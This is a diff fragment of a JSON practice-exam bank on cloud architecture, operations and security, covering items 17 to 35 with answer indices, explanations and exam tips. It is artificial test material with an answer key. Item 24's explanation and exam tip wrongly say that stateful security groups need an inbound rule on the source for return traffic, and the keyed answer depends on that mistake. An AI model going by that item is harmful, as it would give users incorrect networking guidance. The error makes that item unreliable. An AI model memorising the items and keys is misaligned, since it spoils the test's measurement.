+      "question": "A DevOps engineer is implementing a CI/CD pipeline for a containerized application. The pipeline must validate that container images are free from critical security vulnerabilities and compliance violations before deployment to production. Review the pipeline stages below and identify which sequence provides the most comprehensive security validation with minimal operational delays:",
+      "options": [
+        "Build → Unit Test → Integration Test → Security Scan → Compliance Check → Deploy",
+        "Build → Security Scan → Unit Test → Integration Test → Deploy → Compliance Audit",
+        "Security Scan → Build → Unit Test → Integration Test → Compliance Check → Deploy",
+        "Build → Parallel(Unit Test, Security Scan, Compliance Check) → Integration Test → Deploy"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "Running unit tests, security scanning, and compliance checks in parallel after the build stage provides the most comprehensive security validation with minimal operational delays. This approach validates security and compliance early in the pipeline without extending the overall pipeline duration, as these operations happen concurrently rather than sequentially. Unit tests verify basic functionality while security and compliance checks run simultaneously, ensuring issues are caught early without waiting for all tests to complete sequentially. Integration tests then verify component interactions using the validated image. The first option creates unnecessary delays by running security scan and compliance checks sequentially after all testing, potentially discovering issues late in the process. The second option properly positions security scanning early but delays compliance checks until after deployment, which could allow non-compliant images to reach production. The third option attempts to scan for security issues before the build even exists, which isn't logically possible since the container image isn't available until after the build stage.",
+      "examTip": "When designing CI/CD pipelines with security validation, look for opportunities to parallelize independent validation steps (like security scanning, unit testing, and compliance checks) immediately after build completion to maintain speed while shifting security left in the process."
+    },
+    {
+      "id": 18,
+      "question": "A cloud engineer needs to design a backup strategy for a critical database that supports financial transactions. The strategy must ensure point-in-time recovery capability with minimal data loss while optimizing storage costs. The database averages 5GB of new transactions daily with weekly data volume peaks up to 15GB. What is the most appropriate backup configuration?",
+      "options": [
+        "Daily full backups with 30-day retention and continuous transaction log backups with 7-day retention",
+        "Weekly full backups with 30-day retention and daily differential backups with 7-day retention",
+        "Daily incremental backups with automated synthetic full generation weekly and transaction logs backed up hourly",
+        "Continuous replication to standby instance with daily snapshots and transaction log backups every 15 minutes"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "Daily full backups with 30-day retention combined with continuous transaction log backups with 7-day retention provides the optimal solution for point-in-time recovery with minimal data loss. Full daily backups create a complete recovery baseline every 24 hours, enabling efficient recovery without having to process multiple incremental or differential backups. Continuous transaction log backups capture every transaction as it occurs, allowing recovery to any point in time between full backups with minimal data loss (limited only by the frequency of log shipping). This approach balances recovery capabilities with storage efficiency, as transaction logs typically require less space than repeated differential backups. Weekly full backups with daily differentials would increase potential recovery time and data loss. Daily incrementals with synthetic fulls add complexity without significant benefit over daily fulls with transaction logs. Continuous replication to a standby instance is a high-availability solution rather than a backup strategy, and would significantly increase costs while still requiring transaction log backups for point-in-time recovery.",
+      "examTip": "For databases requiring point-in-time recovery capability, implement a strategy that combines regular full backups with continuous transaction log backups—this provides the finest granularity for recovery points while maintaining reasonable storage efficiency."
+    },
+    {
+      "id": 19,
+      "question": "An organization deploys a web application using an auto-scaling group behind a load balancer. During traffic spikes, users report intermittent 502 Bad Gateway errors, despite the auto-scaling group successfully deploying additional instances. Logs show that instances are being marked healthy by the load balancer almost immediately after launching. Which configuration change will resolve this issue?",
+      "options": [
+        "Increase the health check grace period in the auto-scaling group configuration",
+        "Modify the load balancer health check to verify application functionality rather than just TCP connectivity",
+        "Implement connection draining on the load balancer to prevent routing to terminating instances",
+        "Configure a pre-warming script in the instance user data to prepare the application before receiving traffic"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "The scenario describes instances being marked healthy prematurely, resulting in traffic being sent to instances that aren't fully ready to serve requests. This occurs because the default load balancer health checks often only verify basic TCP connectivity rather than actual application readiness. Modifying the load balancer health check to verify application functionality (such as retrieving a specific URL that confirms the application is fully initialized) ensures that traffic is only routed to instances that are truly ready to serve requests. The health check grace period in auto-scaling group configuration prevents instances from being terminated due to failed health checks, but doesn't prevent premature traffic routing by the load balancer. Connection draining helps during scale-in operations by allowing in-flight requests to complete, but doesn't address premature traffic routing to new instances during scale-out. A pre-warming script might help the application initialize faster but doesn't prevent the load balancer from prematurely routing traffic if the health check isn't properly configured to verify application readiness.",
+      "examTip": "When troubleshooting intermittent errors during auto-scaling events, verify that load balancer health checks are actually confirming application readiness, not just network connectivity—an instance with network connectivity may still return errors if the application initialization is incomplete."
+    },
+    {
+      "id": 20,
+      "question": "A company is implementing a multi-account strategy in AWS. Their security requirements mandate centralized logging of all API activities across accounts, with secure long-term storage and tamper-evident controls. Which implementation meets these requirements while optimizing for operational efficiency?",
+      "options": [
+        "Configure AWS CloudTrail in each account to deliver to account-specific S3 buckets with replication to a security account",
+        "Implement an organization trail through AWS Organizations that logs all events to a dedicated logging account's S3 bucket",
+        "Use AWS Config in each account to record API calls and deliver findings to a central SNS topic for processing",
+        "Deploy a custom solution using Lambda functions that call the CloudTrail LookupEvents API and store results centrally"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Implementing an organization trail through AWS Organizations that logs all events to a dedicated logging account's S3 bucket provides the most efficient solution for centralized, secure API activity logging across multiple accounts. Organization trails automatically capture events from all accounts in the organization without requiring per-account configuration, significantly reducing administrative overhead. Delivering logs to a dedicated logging account's S3 bucket provides centralized storage with the ability to implement strict access controls, including bucket policies that prevent deletion or modification of log files by account administrators. This approach ensures tamper-evident controls and secure long-term retention. Configuring CloudTrail in each account with replication creates unnecessary complexity and potential gaps during account creation. AWS Config records resource configurations rather than all API activities and wouldn't provide comprehensive API logging. A custom solution using LookupEvents API would be inefficient, limited by API quotas, and wouldn't capture all events reliably.",
+      "examTip": "When implementing security controls across multi-account environments, leverage organization-level services (like organization trails) that automatically apply to all accounts—including future accounts—rather than solutions requiring per-account configuration that can lead to gaps in coverage."
+    },
+    {
+      "id": 21,
+      "question": "A cloud architect must design a solution for a data processing application with the following requirements:\n- Process large batches of data with variable workloads\n- Maintain high availability for the processing service\n- Minimize costs during periods of low or no processing activity\n- Ensure data is processed in order of submission\n\nWhich architecture meets these requirements most effectively?",
+      "options": [
+        "Deploy worker nodes in an auto-scaling group with SQS standard queue for job distribution",
+        "Implement serverless functions triggered by events with DynamoDB for job tracking",
+        "Use SQS FIFO queue with containerized workers on an auto-scaling ECS cluster",
+        "Create Kubernetes Jobs with resource quotas and node auto-scaling based on pending jobs"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Using SQS FIFO (First-In-First-Out) queue with containerized workers on an auto-scaling ECS cluster best meets all the stated requirements. SQS FIFO guarantees that messages are processed in the exact order they are received and exactly once, satisfying the requirement for processing data in submission order. Containerized workers on ECS provide efficient resource utilization with fast startup times compared to VMs. Auto-scaling ECS clusters can scale to zero during periods of inactivity, minimizing costs when no processing is needed, and scale up to handle variable workloads during peak periods. This combination provides both the ordering guarantees and cost optimization required. An auto-scaling group with standard SQS queue wouldn't guarantee processing order. Serverless functions with DynamoDB could work but might have execution time limitations for large batch processing and wouldn't inherently preserve processing order without additional logic. Kubernetes Jobs provide good batch processing capabilities but typically have higher operational overhead and don't scale to zero as efficiently as serverless container platforms.",
+      "examTip": "When designing architectures for batch processing with ordering requirements, consider message queuing services with FIFO guarantees combined with elastically scaling container platforms that can efficiently scale both up and down based on workload."
+    },
+    {
+      "id": 22,
+      "question": "A cloud administrator needs to implement a cost allocation and tracking system for multiple departments sharing a cloud environment. Each department should receive detailed usage reports and be accountable for their resource consumption. What is the most effective implementation to achieve this goal?",
+      "options": [
+        "Create separate accounts for each department with linked billing and consolidated reporting",
+        "Implement resource tagging standards with cost allocation tags and automated tag compliance verification",
+        "Use dedicated hosts for each department with reserved capacity and custom usage tracking",
+        "Deploy a third-party cloud cost management platform with custom dashboards for each department"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Implementing resource tagging standards with cost allocation tags and automated tag compliance verification provides the most effective cost allocation and tracking system while maintaining operational flexibility. This approach defines a consistent tagging taxonomy (e.g., Department, Project, Cost Center) and enforces it across all resources, enabling detailed cost breakdowns by department without requiring physical or account separation of resources. Automated tag compliance verification ensures that resources don't escape the tracking system through missing or incorrect tags. Cost allocation tags are specifically designed to appear in billing reports and data exports, allowing for detailed department-level charge-back or show-back. Creating separate accounts increases management overhead and complicates resource sharing. Dedicated hosts limit flexibility and efficiency by creating physical separation that prevents resource optimization across departments. Third-party cost management platforms can provide visualization but typically still rely on proper tagging underneath, adding cost without addressing the fundamental tracking mechanism.",
+      "examTip": "For tracking cloud costs across different business units sharing an environment, implement a comprehensive tagging strategy with automated enforcement rather than physically separating resources—this provides detailed allocation visibility while maintaining operational flexibility and resource efficiency."
+    },
+    {
+      "id": 23,
+      "question": "A company runs a data analytics platform that processes sensitive customer information. The security team requires that all data must be encrypted both in transit and at rest, and that the company maintains control of encryption keys. Which encryption implementation satisfies these requirements while supporting efficient data processing?",
+      "options": [
+        "Use cloud-provider managed keys with automatic rotation and audit logging",
+        "Implement client-side encryption with keys stored in a hardware security module",
+        "Deploy a customer-managed key store with envelope encryption and key usage authorization policies",
+        "Configure storage-level encryption with keys generated and managed by the application"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Deploying a customer-managed key store with envelope encryption and key usage authorization policies provides the optimal balance of security control and processing efficiency. This approach allows the company to maintain full control over the encryption keys used to protect their data (satisfying the control requirement) while leveraging the processing efficiency of server-side encryption. Envelope encryption (where data is encrypted with a data key, which is itself encrypted by a master key) provides additional security by limiting exposure of the master key. Key usage authorization policies enable granular control over which services and principals can use the keys for encryption and decryption operations. Cloud-provider managed keys don't provide the company with full control as required. Client-side encryption provides strong security but significantly impacts processing efficiency by requiring all data to be decrypted client-side before analysis. Storage-level encryption with application-managed keys creates key management complexity and potential availability risks without the security benefits of a dedicated key management infrastructure.",
+      "examTip": "When implementing encryption for sensitive data processing, consider envelope encryption with customer-managed keys stored in a dedicated key management service—this approach maintains control over keys while allowing efficient server-side encryption and decryption during processing."
+    },
+    {
+      "id": 24,
+      "question": "A cloud engineer is troubleshooting connectivity issues between a containerized application and an RDS database. The application container logs show connection timeouts, but the database is operational and can be accessed from other services. The engineer reviews the following configuration snippets:\n\nContainer Security Group:\n- Inbound: None specified\n- Outbound: Allow All\n\nDatabase Security Group:\n- Inbound: Allow TCP 3306 from Application Security Group\n- Outbound: Allow All\n\nWhat change would resolve the connectivity issue?",
+      "options": [
+        "Add an inbound rule to the Container Security Group allowing traffic from the Database Security Group",
+        "Modify the Database Security Group inbound rule to allow TCP 3306 from 0.0.0.0/0",
+        "Create a network ACL allowing traffic between the container subnet and database subnet",
+        "Add a NAT Gateway to the container subnet to enable outbound internet access"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The issue is with the security group configuration, specifically the lack of inbound rules on the Container Security Group. In AWS, security groups are stateful, meaning that if an outbound connection is initiated, the return traffic is automatically allowed regardless of inbound rules. However, this applies only to established connections. In this case, the Database Security Group correctly allows inbound traffic from the Application Security Group, but the Container Security Group has no inbound rules to allow the return traffic from the database. Adding an inbound rule to the Container Security Group allowing traffic from the Database Security Group will complete the bidirectional communication path. Modifying the Database Security Group to allow 0.0.0.0/0 would create an unnecessary security risk by exposing the database to all potential sources. Network ACLs are stateless and would need both inbound and outbound rules, but the issue here is with security groups, not network ACLs. A NAT Gateway enables outbound internet access, but the issue is communication between internal resources, not internet connectivity.",
+      "examTip": "When troubleshooting connectivity issues between resources in AWS, always check security group rules in both directions—even though security groups are stateful, the initial connection must be allowed by an inbound rule on the destination and return traffic must be allowed by an inbound rule on the source."
+    },
+    {
+      "id": 25,
+      "question": "A company is planning to migrate a critical database from on-premises to the cloud. The database must maintain high availability with an RPO of 1 minute and RTO of 15 minutes. It experiences periods of high write activity and requires point-in-time recovery capability. Which database deployment architecture best meets these requirements?",
+      "options": [
+        "Multi-AZ deployment with synchronous replication and automated backups with transaction log archiving",
+        "Single instance deployment with asynchronous replication to a read replica and continuous backups",
+        "Database cluster with asynchronous multi-region replication and scheduled snapshots",
+        "Global database with active-active configuration and eventual consistency model"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "A Multi-AZ deployment with synchronous replication and automated backups with transaction log archiving best meets the requirements for high availability with strict RPO and RTO targets. Synchronous replication in a Multi-AZ configuration ensures that data is committed to both the primary and standby instances before the transaction is confirmed, effectively providing an RPO of zero for instance failures. Automated failover typically completes within 1-3 minutes, well within the 15-minute RTO requirement. Transaction log archiving enables point-in-time recovery capability with minimal data loss (typically 1-5 minutes of the most recent transactions), satisfying the 1-minute RPO requirement. This architecture handles high write activity with minimal performance impact while maintaining strong consistency. A single instance with asynchronous replication wouldn't meet the RPO requirement as asynchronous replication can lead to data loss during failover. A database cluster with multi-region asynchronous replication would have similar RPO concerns and typically longer failover times. A global database with active-active configuration uses eventual consistency, which wouldn't be appropriate for a critical database requiring strict consistency during high write activity.",
+      "examTip": "For migration of critical databases with strict RPO/RTO requirements, prioritize architectures that use synchronous replication for high availability failures and complement this with continuous transaction log backups for point-in-time recovery—this combination addresses both instance failures and data corruption scenarios."
+    },
+    {
+      "id": 26,
+      "question": "A company uses Kubernetes for deploying applications across multiple environments (development, staging, production). The operations team needs to enforce consistent resource quotas, network policies, and security contexts across all deployments without requiring developers to define these controls in their manifests. Which Kubernetes feature should be implemented to achieve this goal?",
+      "options": [
+        "Custom Resource Definitions with Operators that modify deployments",
+        "Admission Controllers with ValidatingWebhookConfiguration and MutatingWebhookConfiguration",
+        "Network Policy Controller with default deny-all policy",
+        "Role-Based Access Control with restrictive ClusterRoles"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Admission Controllers with ValidatingWebhookConfiguration and MutatingWebhookConfiguration provide the most effective way to enforce consistent policies across Kubernetes deployments without requiring developer intervention. Admission controllers intercept requests to the Kubernetes API server before object persistence, allowing for policy enforcement. ValidatingWebhooks can reject non-compliant resources, while MutatingWebhooks can modify resources to inject required configurations automatically. This allows the operations team to enforce resource quotas, add network policies, and set security contexts consistently across all deployments without requiring developers to include these in their manifests. Custom Resource Definitions with Operators would require developers to use these custom resources rather than enforcing policies on standard resources. Network Policy Controllers can enforce network isolation but don't address resource quotas or security contexts. RBAC with restrictive ClusterRoles controls who can perform actions but doesn't automatically modify or validate the content of resources being created.",
+      "examTip": "For enforcing consistent policies across Kubernetes deployments without modifying application manifests, implement admission controllers with webhooks that can validate and mutate resources during creation—this provides a separation of concerns between application deployment and operational policy enforcement."
+    },
+    {
+      "id": 27,
+      "question": "A cloud engineer is designing a solution to protect a web application from common attack vectors. The application is deployed on virtual machines behind a load balancer and serves both static and dynamic content. Review the security controls below and identify which missing protection would leave the application most vulnerable:",
+      "options": [
+        "Web Application Firewall with OWASP Top 10 rule sets",
+        "DDoS protection service with automatic scaling",
+        "TLS termination with modern cipher suites only",
+        "Content Security Policy headers in all HTTP responses"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The absence of a Web Application Firewall (WAF) with OWASP Top 10 rule sets would leave the application most vulnerable to common attacks. A WAF specifically protects against application-layer attacks such as SQL injection, cross-site scripting, file inclusion, and other OWASP Top 10 vulnerabilities that directly target application functionality. These attacks can lead to data breaches, unauthorized access, and complete application compromise. Without a WAF, attackers could directly exploit vulnerabilities in the application code even if other security controls are in place. DDoS protection services defend against volumetric and protocol attacks that attempt to overwhelm resources but don't address application-layer vulnerabilities. TLS termination with modern cipher suites ensures secure transport but doesn't protect against malicious requests sent over encrypted connections. Content Security Policy headers help mitigate some client-side attacks like XSS but don't provide comprehensive protection against server-side vulnerabilities like SQL injection or server-side request forgery.",
+      "examTip": "When prioritizing security controls for web applications, ensure that both network-layer protections (like DDoS mitigation) and application-layer protections (like WAF) are implemented—application-layer attacks often pose the greatest risk as they directly target application vulnerabilities that bypass network security controls."
+    },
+    {
+      "id": 28,
+      "question": "An e-commerce company is experiencing slow response times during peak traffic periods. The application uses a traditional three-tier architecture with web servers, application servers, and a relational database. The database is currently the bottleneck, showing high CPU utilization and increased read latency. Which caching strategy would most effectively improve performance without requiring application code changes?",
+      "options": [
+        "Implement browser caching with appropriate cache-control headers for static assets",
+        "Deploy a content delivery network (CDN) for static content offloading",
+        "Add a distributed in-memory cache for database query results with time-based invalidation",
+        "Configure the database with read replicas for read query distribution"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Adding a distributed in-memory cache for database query results with time-based invalidation would most effectively improve performance without requiring application code changes when the database is the bottleneck. This approach caches frequently accessed query results in memory, dramatically reducing database load for read operations without modifying application logic. Many caching systems can be implemented transparently through database proxies that intercept queries, check the cache, and only forward to the database when necessary. Time-based invalidation ensures data freshness while maintaining performance benefits. Browser caching and CDNs would help with static asset delivery but wouldn't address the database bottleneck that's explicitly identified as the problem. Database read replicas would help distribute read queries but still require each query to hit a database instance, consuming more resources than serving from memory, and might require application changes to route certain queries to replicas.",
+      "examTip": "When addressing database performance bottlenecks, consider the full hierarchy of caching opportunities—in-memory query result caching often provides the greatest performance improvement with the least architectural disruption, particularly for read-heavy workloads with repetitive queries."
+    },
+    {
+      "id": 29,
+      "question": "A cloud security engineer reviews the following AWS CloudTrail log entry:\n\n```json\n{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"AssumedRole\",\n    \"principalId\": \"AROA1EXAMPLE:session_name\",\n    \"arn\": \"arn:aws:sts::123456789012:assumed-role/role_name/session_name\",\n    \"accountId\": \"123456789012\",\n    \"accessKeyId\": \"ASIA2EXAMPLE\",\n    \"sessionContext\": {\n      \"sessionIssuer\": {\n        \"type\": \"Role\",\n        \"principalId\": \"AROA1EXAMPLE\",\n        \"arn\": \"arn:aws:iam::123456789012:role/role_name\",\n        \"accountId\": \"123456789012\",\n        \"userName\": \"role_name\"\n      },\n      \"webIdFederationData\": {},\n      \"attributes\": {\n        \"creationDate\": \"2023-04-12T15:14:16Z\",\n        \"mfaAuthenticated\": \"false\"\n      }\n    }\n  },\n  \"eventTime\": \"2023-04-12T15:20:10Z\",\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"GetObject\",\n  \"awsRegion\": \"us-east-1\",\n  \"sourceIPAddress\": \"203.0.113.100\",\n  \"userAgent\": \"aws-cli/2.9.19\",\n  \"requestParameters\": {\n    \"bucketName\": \"customer-financial-data\",\n    \"key\": \"2023/q1/transactions.csv\"\n  },\n  \"responseElements\": null,\n  \"additionalEventData\": {\n    \"SignatureVersion\": \"SigV4\",\n    \"CipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n    \"AuthenticationMethod\": \"AuthHeader\"\n  },\n  \"requestID\": \"EXAMPLE1234567890\",\n  \"eventID\": \"EXAMPLE8765432190\",\n  \"readOnly\": true,\n  \"resources\": [\n    {\n      \"accountId\": \"123456789012\",\n      \"type\": \"AWS::S3::Object\",\n      \"ARN\": \"arn:aws:s3:::customer-financial-data/2023/q1/transactions.csv\"\n    },\n    {\n      \"accountId\": \"123456789012\",\n      \"type\": \"AWS::S3::Bucket\",\n      \"ARN\": \"arn:aws:s3:::customer-financial-data\"\n    }\n  ],\n  \"eventType\": \"AwsApiCall\",\n  \"managementEvent\": false,\n  \"recipientAccountId\": \"123456789012\",\n  \"eventCategory\": \"Data\"\n}\n```\n\nWhat security concern does this log entry indicate?",
+      "options": [
+        "The role is accessing S3 data without multi-factor authentication",
+        "The IP address accessing the data is from an unusual location",
+        "The request is using an outdated TLS cipher suite for encryption",
+        "The S3 bucket policy is not enforcing encryption in transit"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The log entry indicates that a role is accessing sensitive financial data without multi-factor authentication. The \"sessionContext\" section includes \"mfaAuthenticated\": \"false\", which shows that the role session was assumed without MFA verification. Given that the object being accessed is from a bucket named \"customer-financial-data\" and specifically accessing transaction information, this represents a security concern as sensitive financial data should require additional authentication factors for access. The source IP address (203.0.113.100) doesn't inherently indicate an unusual location without additional context about normal access patterns. The CipherSuite shown (ECDHE-RSA-AES128-GCM-SHA256) is a modern, secure TLS cipher suite and doesn't represent a security concern. The log doesn't provide information about the bucket policy or encryption requirements, so we cannot determine if there's an issue with encryption enforcement.",
+      "examTip": "When analyzing CloudTrail logs for security concerns, pay special attention to authentication attributes like mfaAuthenticated and match them against the sensitivity of the resources being accessed—roles accessing sensitive data typically should require multi-factor authentication."
+    },
+    {
+      "id": 30,
+      "question": "A cloud deployment automated through Terraform includes a configuration file with the following resource definition:\n\n```hcl\nresource \"aws_s3_bucket\" \"data_bucket\" {\n  bucket = \"company-customer-data-${var.environment}\"\n\n  tags = {\n    Environment = var.environment\n    Department  = \"Data Analytics\"\n  }\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"data_bucket_access\" {\n  bucket = aws_s3_bucket.data_bucket.id\n\n  block_public_acls       = true\n  block_public_policy     = true\n  ignore_public_acls      = true\n  restrict_public_buckets = true\n}\n```\n\nWhich additional security control should be added to this configuration to better protect sensitive data?",
+      "options": [
+        "Enable versioning to protect against accidental deletion and allow recovery",
+        "Configure server-side encryption with KMS keys for data at rest protection",
+        "Add a lifecycle policy to automatically archive older objects to Glacier",
+        "Implement bucket logging to track access and changes to bucket objects"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "The current configuration correctly blocks all public access to the bucket, which is an important security control, but it lacks encryption for data at rest. Configuring server-side encryption with KMS keys would provide protection for sensitive customer data stored in the bucket, preventing unauthorized access to the data if the underlying storage is compromised or if backup media is lost or stolen. This is particularly important for a bucket named \"company-customer-data\" which likely contains sensitive customer information. The additional encryption control would be implemented using the aws_s3_bucket_server_side_encryption_configuration resource. Enabling versioning protects against accidental deletion but doesn't provide data confidentiality. Lifecycle policies for archiving to Glacier affect storage costs and data accessibility but not security. Bucket logging provides visibility and audit capability but doesn't directly protect the data itself from unauthorized access.",
+      "examTip": "When reviewing infrastructure as code for security, ensure that resources storing sensitive data implement appropriate protective controls for both access (like public access blocks) and data confidentiality (like encryption at rest)—both are necessary for comprehensive security."
+    },
+    {
+      "id": 31,
+      "question": "An organization is implementing a serverless architecture for event processing. The solution processes messages from multiple sources, performs transformations, and stores results in a database. During testing, the team notices that some events are being processed multiple times, causing duplicate records. Examine the service configuration snippets and identify the cause of the duplicate processing:\n\nLambda Function Configuration:\n```\nTimeout: 30 seconds\nMemory: 512 MB\nReserved Concurrency: Not configured\n```\n\nEvent Source (SQS):\n```\nBatch Size: 10\nMaximum Batching Window: 0 seconds\nVisibility Timeout: 30 seconds\n```\n\nFunction Code Excerpt:\n```python\ndef lambda_handler(event, context):\n    for record in event['Records']:\n        process_message(record)  # Average processing time: 5-10 seconds per message\n        # No explicit deletion of message\n```",
+      "options": [
+        "The Lambda function timeout equals the SQS visibility timeout, causing message redelivery if processing approaches timeout",
+        "Missing explicit message deletion after processing in the Lambda handler code",
+        "Maximum batching window of 0 seconds is causing premature message delivery before batch completion",
+        "Insufficient memory allocation causing function throttling and message reprocessing"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The issue is that the Lambda function timeout (30 seconds) equals the SQS visibility timeout (30 seconds). If the function processes messages that take close to the timeout period or experiences any slight delays, the execution might not complete before the visibility timeout expires. When the visibility timeout expires, SQS assumes the message wasn't processed successfully and makes it available for delivery again, causing duplicate processing. This risk is especially high with batch processing, as processing 10 messages at 5-10 seconds each could easily approach the 30-second timeout. The Lambda function doesn't need to explicitly delete messages from SQS; this happens automatically when the function completes successfully without errors. The batching window of 0 seconds affects how quickly messages are gathered for a batch but doesn't cause duplicate processing. There's no indication of memory-related throttling in the provided information, and throttling typically results in invocation failures rather than duplicate processing.",
+      "examTip": "When configuring serverless event processing with queues, always ensure that the visibility timeout is significantly longer than the function timeout (recommended at least 6 times longer) to prevent duplicate processing due to timeout race conditions."
+    },
+    {
+      "id": 32,
+      "question": "A cloud engineer is designing a solution to protect sensitive data stored in a cloud database. The design must ensure that data is encrypted both at rest and in transit, and comply with a requirement that encryption keys must never be stored in the same cloud environment as the encrypted data. Which encryption approach satisfies these requirements?",
+      "options": [
+        "Use client-side encryption with keys managed in an on-premises HSM that connects to the cloud via dedicated link",
+        "Implement transparent data encryption with keys stored in a separate cloud provider's key management service",
+        "Configure storage-level encryption with keys generated by the application and stored in environment variables",
+        "Enable cloud provider encryption with hold-your-own-key option and keys stored in a third-party escrow service"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "Client-side encryption with keys managed in an on-premises HSM (Hardware Security Module) connected via dedicated link satisfies the requirement that encryption keys must never be stored in the same cloud environment as the encrypted data. With this approach, data is encrypted by the application before it reaches the cloud using encryption keys that remain on-premises in the HSM. The encrypted data is stored in the cloud database, but the keys never leave the organization's physical control, ensuring complete separation between keys and encrypted data. The dedicated link provides secure connectivity for encryption operations. Transparent data encryption with keys in a separate cloud provider still stores keys in a cloud environment, just a different one. Storage-level encryption with keys in environment variables would store the keys in the same cloud environment as the data. Cloud provider encryption with hold-your-own-key still typically involves the keys being used within the provider's environment, even if they originate elsewhere.",
+      "examTip": "When regulatory requirements mandate complete separation between encryption keys and encrypted data, prioritize client-side encryption approaches where keys remain under physical control outside the cloud environment—this provides the strongest guarantee of separation despite the additional operational complexity."
+    },
+    {
+      "id": 33,
+      "question": "A cloud operations team is experiencing a production incident where a critical service is returning 503 errors intermittently. The service runs on multiple container instances behind a load balancer. During troubleshooting, the team collects the following metrics:\n\n- Container CPU utilization: 40-45%\n- Container memory utilization: 75-80%\n- Load balancer healthy host count: Fluctuating between 5-10 (out of 10 total)\n- Database connections: 85% of maximum capacity\n- Network packets dropped: <0.01%\n\nContainer logs show the following error repeating periodically:\n```\n[ERROR] java.lang.OutOfMemoryError: Java heap space\n[ERROR] Service restarting due to unhandled exception\n```\n\nWhat is the root cause of the service instability?",
+      "options": [
+        "Insufficient container memory allocation for the Java application heap requirements",
+        "Database connection pool exhaustion causing request queuing and timeouts",
+        "Network packet drops leading to incomplete requests and service errors",
+        "Load balancer incorrectly marking healthy containers as unhealthy"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The root cause of the service instability is insufficient container memory allocation for the Java application's heap requirements. The container logs explicitly show \"java.lang.OutOfMemoryError: Java heap space\" errors, which indicate that the Java application is attempting to allocate more heap memory than is available to it. This is followed by service restarts, which explains the fluctuating healthy host count at the load balancer as containers crash and restart. While the container memory utilization is at 75-80%, this represents the overall container memory, not specifically the Java heap allocation, which has its own limits configured within the Java process. The database connection usage is high (85%) but not exhausted, and would typically cause different error patterns if it were the root cause. Network packet drops are minimal (<0.01%) and unlikely to cause widespread 503 errors. The load balancer's fluctuating healthy host count is a symptom of containers becoming unhealthy due to the memory errors, not a cause of the instability.",
+      "examTip": "When troubleshooting container-based Java applications, distinguish between container-level memory metrics and JVM heap allocation—a container can have available memory while the Java process still experiences heap space errors if the JVM's heap size configuration is inadequate for the application's needs."
+    },
+    {
+      "id": 34,
+      "question": "A cloud security team wants to implement a comprehensive strategy for detecting and responding to potential security incidents across their multi-cloud environment. Using multiple security tools and services, they've collected the following security signals:\n\n1. Authentication failures from unusual locations\n2. API calls from previously unused service accounts\n3. Network traffic to known malicious IP addresses\n4. Sensitive data access patterns outside business hours\n5. Unusual resource provisioning in development environments\n\nWhich approach would most effectively reduce alert fatigue while ensuring critical security events are detected?",
+      "options": [
+        "Configure each security tool to send all alerts to a centralized SIEM with pre-defined correlation rules",
+        "Implement risk scoring based on the combination of signals with context-aware alert thresholds",
+        "Deploy machine learning models trained on historical alert data to predict true positive events",
+        "Create separate alert queues for each security domain with dedicated analyst assignment"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Implementing risk scoring based on the combination of signals with context-aware alert thresholds would most effectively reduce alert fatigue while ensuring critical security events are detected. This approach evaluates multiple security signals in combination, considering contextual factors such as user behavior baselines, asset criticality, and threat intelligence. Rather than treating each signal as a separate alert, risk scoring aggregates signals into security incidents with severity levels based on the cumulative risk. Context-aware thresholds adjust sensitivity based on factors like the environment (production vs. development) and asset importance. This reduces alert volume by surfacing high-risk combinations while suppressing isolated low-risk signals. Sending all alerts to a SIEM with pre-defined correlation rules could help identify some patterns but lacks the nuanced, adaptive approach of risk scoring with contextual awareness. Machine learning for prediction can complement but not replace a risk-based approach, especially without established baselines. Creating separate alert queues by domain can improve workflow but doesn't address the fundamental alert volume issue.",
+      "examTip": "To reduce security alert fatigue in complex cloud environments, implement approaches that consider multiple signals in context rather than treating each detection as an isolated alert—risk scoring methodologies that incorporate asset criticality, behavior baselines, and environmental context typically provide the best balance of detection capability and analyst efficiency."
+    },
+    {
+      "id": 35,
+      "question": "A cloud engineer is troubleshooting inconsistent behavior in a containerized application deployed across multiple nodes. Some containers process requests correctly, while others return errors. The application configuration is injected through environment variables and is identical across all containers. Logs from a failing container show the following entries:\n\n```\n2023-04-15T14:20:10Z INFO Starting application version 2.3.4\n2023-04-15T14:20:11Z INFO Connecting to database at db.example.com:5432\n2023-04-15T14:20:12Z WARN Connection pool limit reached, waiting for available connection\n2023-04-15T14:20:40Z ERROR Connection attempt timed out after 30 seconds\n2023-04-15T14:20:40Z ERROR Failed to initialize database component\n```\n\nLogs from a working container are identical except no connection pool warnings or timeout errors appear. What is the most likely cause of this inconsistent behavior?",
+      "options": [
+        "Insufficient memory allocation causing garbage collection pauses in some containers",
+        "Network policy rules restricting egress traffic from specific container hosts",
+        "Database connection limits leading to connection pool exhaustion under load",
+        "Container image version mismatch between nodes causing different behavior"
+      ],
+      "correctAnswerIndex": 2,
